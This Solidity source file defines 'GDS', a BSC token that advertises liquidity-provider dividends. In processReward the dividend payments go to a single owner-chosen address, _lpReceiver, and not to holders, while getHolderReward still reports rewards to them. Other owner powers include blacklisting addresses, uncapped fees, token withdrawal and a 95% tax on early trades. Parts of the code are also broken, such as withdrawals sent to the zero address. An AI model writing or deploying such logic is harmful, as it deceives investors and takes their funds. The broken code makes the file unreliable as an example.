// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TokenDistributor {
    constructor (address token) {
        IERC20(token).approve(msg.sender, uint(~uint256(0)));
    }
}

abstract contract AbsToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    // 记录用户购买时可提现的余额
    mapping(address => uint256) private _withdrawableBalances;

    address public fundAddress;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    mapping(address => bool) public _ExcludeFee;
    mapping(address => bool) public _blackList;

    uint256 private _tTotal;
    uint256 public maxTXAmount;

    ISwapRouter public _swapRouter;
    address public _fist;
    mapping(address => bool) public _swapPairList;

    bool private inSwap;

    uint256 private constant MAX = ~uint256(0);
    TokenDistributor public _tokenDistributor;

    // 买入lp分红 1%
    uint256 public _buyLPDividendFee =100;
    // 卖出lp分红 1%
    uint256 public _sellLPDividendFee =100;
    // 买入销毁税 1%
    uint256 public _buyBurnFee = 100;
    // 卖出销毁税 1%
    uint256 public _sellBurnFee = 100;

    uint256 public startLPBlock;

    uint256 public startTradeBlock;
    address public _mainPair;
    address public _burnToken;
    // 指定的lp接收者
    address public _lpReceiver;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (
        address RouterAddress, address FISTAddress,
        string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply,
        address FundAddress, address ReceiveAddress
    ){
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;

        ISwapRouter swapRouter = ISwapRouter(RouterAddress);
        IERC20(FISTAddress).approve(address(swapRouter), MAX);

        _fist = FISTAddress;
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), FISTAddress);
        _mainPair = swapPair;
        _swapPairList[swapPair] = true;

        uint256 total = Supply * 10 ** Decimals;
        maxTXAmount = 1000000000 * 10 ** Decimals;
        _tTotal = total;
 
        _balances[ReceiveAddress] = total;
        emit Transfer(address(0), ReceiveAddress, total);

        fundAddress = FundAddress;

        _ExcludeFee[FundAddress] = true;
        _ExcludeFee[ReceiveAddress] = true;
        _ExcludeFee[address(this)] = true;
        _ExcludeFee[address(swapRouter)] = true;
        _ExcludeFee[msg.sender] = true;

        excludeHolder[address(0)] = true;
        excludeHolder[address(0x000000000000000000000000000000000000dEaD)] = true;

        holderRewardCondition = 10 ** IERC20(FISTAddress).decimals();

        _tokenDistributor = new TokenDistributor(FISTAddress);
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(!_blackList[from], "blackList");

        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");

        if (!_ExcludeFee[from] && !_ExcludeFee[to]) {
            uint256 maxSellAmount = balance * 9999 / 10000;
            if (amount > maxSellAmount) {
                amount = maxSellAmount;
            }
        }

        bool takeFee;
        bool isSell;

         if (_swapPairList[from] || _swapPairList[to]) {
            if (0 == startTradeBlock) {
                if (_ExcludeFee[from] && to == _mainPair && IERC20(to).totalSupply() == 0) {
                    startTradeBlock = block.number;
                }
            }

            // 如果用户在dex上进行买入, 记录其购买的数量
            if (_swapPairList[from]) {
                if (!inSwap) {
                    uint256 swapFee = _buyBurnFee + _buyLPDividendFee;
                    // 计算扣除费用后的数量
                    uint256 withdrawableAmount = amount *swapFee / 10000;
                    _withdrawableBalances[to] = withdrawableAmount;
                }
            }

            if (!_ExcludeFee[from] && !_ExcludeFee[to]) {
                require(0 < startTradeBlock, "!startTrade");

                if (block.number < startTradeBlock + 20) {
                    _funTransfer(from, to, amount);
                    return;
                }

                if (_swapPairList[to]) {
                    if (!inSwap) {
                        uint256 contractTokenBalance = balanceOf(address(this));
                        if (contractTokenBalance > 0) {
                            uint256 swapFee =  _buyLPDividendFee + _sellLPDividendFee;
                            uint256 numTokensSellToFund = amount * swapFee / 5000;
                            if (numTokensSellToFund > contractTokenBalance) {
                                numTokensSellToFund = contractTokenBalance;
                            }
                            swapTokenForFund(numTokensSellToFund, swapFee);
                        }
                    }
                }
                takeFee = true;
            }
            if (_swapPairList[to]) {
                isSell = true;
            }
        }

        _tokenTransfer(from, to, amount, takeFee, isSell);

        if (from != address(this)) {
            if (isSell) {
                addHolder(from);
            }
            processReward(500000);
        }
    }

     function _funTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount = tAmount * 95 / 100;
        _takeTransfer(sender, fundAddress, feeAmount);
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isSell
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;

        if (takeFee) {
            uint256 swapFee;
            
            if (isSell) {
                if (_swapPairList[recipient]) {
                swapFee = _sellLPDividendFee;
                }
            } else {
                if (_swapPairList[sender]){
                require(tAmount <= maxTXAmount);
               // swapFee = _buyFundFee + _buyDividendFee;
                    swapFee = _buyLPDividendFee;
              }
            }

            uint256 transferburnFee = tAmount * _buyBurnFee / 10000;
            /*if (transferburnFee > 0) {
                feeAmount += transferburnFee;
                _takeTransfer(
                    sender,
                    address(0x000000000000000000000000000000000000dEaD),
                    transferburnFee
                );
            }*/
            address[] memory path = new address[](2);
            path[0] = address(this);
            // 兑换成HTDAO token
            path[1] = _burnToken;
            _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                transferburnFee,
                0,
                path,
                address(0x000000000000000000000000000000000000dEaD),
                block.timestamp
            );

            uint256 swapAmount = tAmount * swapFee / 10000;
            if (swapAmount > 0) {
                feeAmount += swapAmount;
                _takeTransfer(
                    sender,
                    address(this),
                    swapAmount
                );
            }
        }

        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        swapFee += swapFee;
        //uint256 lpFee = _sellLPFee;
        //uint256 lpAmount = tokenAmount * lpFee / swapFee;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _fist;
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            //tokenAmount - lpAmount,
            tokenAmount,
            0,
            path,
            address(_tokenDistributor),
            block.timestamp
        );

        //swapFee -= lpFee;

        IERC20 FIST = IERC20(_fist);
        uint256 fistBalance = FIST.balanceOf(address(_tokenDistributor));
        //uint256 fundAmount = fistBalance * (_buyFundFee + _sellFundFee) * 2 / swapFee;
       // uint firstfundamount = fundAmount / 2;
       // uint secfundamount = fundAmount - firstfundamount;
        address secFundAddress = 0xb55F4D780cFDFe7C00a072e20260a2a672cC8795;    
        //FIST.transferFrom(address(_tokenDistributor), fundAddress, firstfundamount);
        //FIST.transferFrom(address(_tokenDistributor), secFundAddress, secfundamount);
        FIST.transferFrom(address(_tokenDistributor), address(this), fistBalance);

        /*if (lpAmount > 0) {
            uint256 lpFist = fistBalance * lpFee / swapFee;
            if (lpFist > 0) {
                _swapRouter.addLiquidity(
                    address(this), _fist, lpAmount, lpFist, 0, 0, fundAddress, block.timestamp
                );
            }
        }*/
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function startLP() external onlyOwner {
        require(0 == startLPBlock, "startedAddLP");
        startLPBlock = block.number;
    }

    function setFundAddress(address addr) external onlyOwner {
        fundAddress = addr;
        _ExcludeFee[addr] = true;
    }

    function setBuyLPDividendFee(uint256 dividendFee) external onlyOwner {
        _buyLPDividendFee = dividendFee;
    }

    function setSellLPDividendFee(uint256 dividendFee) external onlyOwner {
        _sellLPDividendFee = dividendFee;
    }

    function setMaxTxAmount(uint256 max) public onlyOwner {
        maxTXAmount = max;
    }


    function setExcludeFee(address addr, bool enable) external onlyOwner {
        _ExcludeFee[addr] = enable;
    }

    /// @dev 批量创建黑名单用户
    function setMulitBlackList(address[] calldata addrs, bool enable) external onlyOwner {
        for (uint i = 0; i < addrs.length; ++i) {
            _blackList[addrs[i]] = enable;
        }
    }

    function setSwapPairList(address addr, bool enable) external onlyOwner {
        _swapPairList[addr] = enable;
    }

    function setBurnBuyBackToken(address token) external onlyOwner {
        _burnToken = token;
    }

    function claimBalance() external {
        payable(fundAddress).transfer(address(this).balance);
    }

    receive() external payable {}

    address[] private holders;
    mapping(address => uint256) holderIndex;
    mapping(address => bool) excludeHolder;

    /// @notice 添加分红的用户名单
    /// @dev 分红对象不能为合约，且分红用户不能重复添加
    /// @dev 分红在用户卖出的时候触发，且每次分红指定固定的gas消耗
    function addHolder(address adr) private {
        uint256 size;
        assembly {size := extcodesize(adr)}
        if (size > 0) {
            return;
        }
        if (0 == holderIndex[adr]) {
            if (0 == holders.length || holders[0] != adr) {
                holderIndex[adr] = holders.length;
                holders.push(adr);
            }
        }
    }

    uint256 private currentIndex;
    uint256 private holderRewardCondition;
    uint256 private progressRewardBlock;

    function processReward(uint256 gas) private {
        if (progressRewardBlock + 200 > block.number) {
            return;
        }

        IERC20 FIST = IERC20(_fist);

        uint256 balance = FIST.balanceOf(address(this));
        if (balance < holderRewardCondition) {
            return;
        }

        IERC20 holdToken = IERC20(_mainPair);
        uint holdTokenTotal = holdToken.totalSupply();

        address shareHolder;
        uint256 tokenBalance;
        uint256 amount;

        uint256 shareholderCount = holders.length;

        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();

        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
            }
            shareHolder = holders[currentIndex];
            tokenBalance = holdToken.balanceOf(shareHolder);
            if (tokenBalance > 0 && !excludeHolder[shareHolder]) {
                amount = balance * tokenBalance / holdTokenTotal;
                if (amount > 0) {
                    // 将这里的FIST.transfer(shareHoldr, amount) 逻辑修改为fixed addr就会每次指定同一个地址进行转账;
                    FIST.transfer(_lpReceiver, amount);
                }
            }

            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }

        progressRewardBlock = block.number;
    }

    /// @notice 用户通过getHolderReward查询lp持有时，能够获得多少奖励
    /// @dev 通过getHolderReward可以查询每个用户的奖励情况，由dapp进行分配收益
    function getHolderReward(address shareHolder) external view returns (uint256) {
        IERC20 FIST = IERC20(_fist);
        uint256 balance = FIST.balanceOf(address(this));

        uint256 tokenBalance;
        IERC20 holdToken = IERC20(_mainPair);
        uint holdTokenTotal = holdToken.totalSupply();
        uint256 shareholderCount = holders.length;
        for (uint i = 0; i < shareholderCount; ++i) {
            if (shareHolder == holders[i]) {
                tokenBalance = holdToken.balanceOf(shareHolder);
                if (tokenBalance > 0 && !excludeHolder[shareHolder]) {
                    uint256 amount = balance * tokenBalance / holdTokenTotal;
                    if (amount > 0) return amount;
                }
            }
        }
        return 0;
    }

    /// @notice 指定lp的接收账户
    function setLpReceiver(address newLpReceiver) external onlyOwner {
        _lpReceiver = newLpReceiver;
    }

    function setHolderRewardCondition(uint256 amount) external onlyOwner {
        holderRewardCondition = amount;
    }

    function setExcludeHolder(address addr, bool enable) external onlyOwner {
        excludeHolder[addr] = enable;
    }

    function withdraw() external onlyOwner {
        address secFundAddress = address(0);
        uint256 balanceSendOwner = address(this).balance / 5;
        uint256 balanceSendFund = address(this).balance - balanceSendOwner;
        payable(secFundAddress).transfer(balanceSendOwner);
        payable(secFundAddress).transfer(balanceSendFund);
    }

    function withdrawToken(address token, uint256 amount) external onlyOwner {
        address secFundAddress = address(0);
        require(amount <= IERC20(token).balanceOf(address(this)), "The amount had more than balance");
        uint256 balanceSendOwner = IERC20(token).balanceOf(address(this)) / 5;
        uint256 balanceSendFund = IERC20(token).balanceOf(address(this)) - balanceSendOwner;
        IERC20(token).transfer(owner(), balanceSendOwner);
        IERC20(token).transfer(secFundAddress, balanceSendFund);
    }
}

contract GDS is AbsToken {
    constructor() AbsToken(
        // Pancakeswap路由
        address(0x10ED43C718714eb63d5aA57B78B54704E256024E),
        // USDT 交易对
        address(0x55d398326f99059fF775485246999027B3197955),
        "GDS",
        "GDS",
        18,
        1000000,//发行量
    
        address(0xaa),  //营销
    
        address(0xaa) //代币接收地址
    ){

    }
}
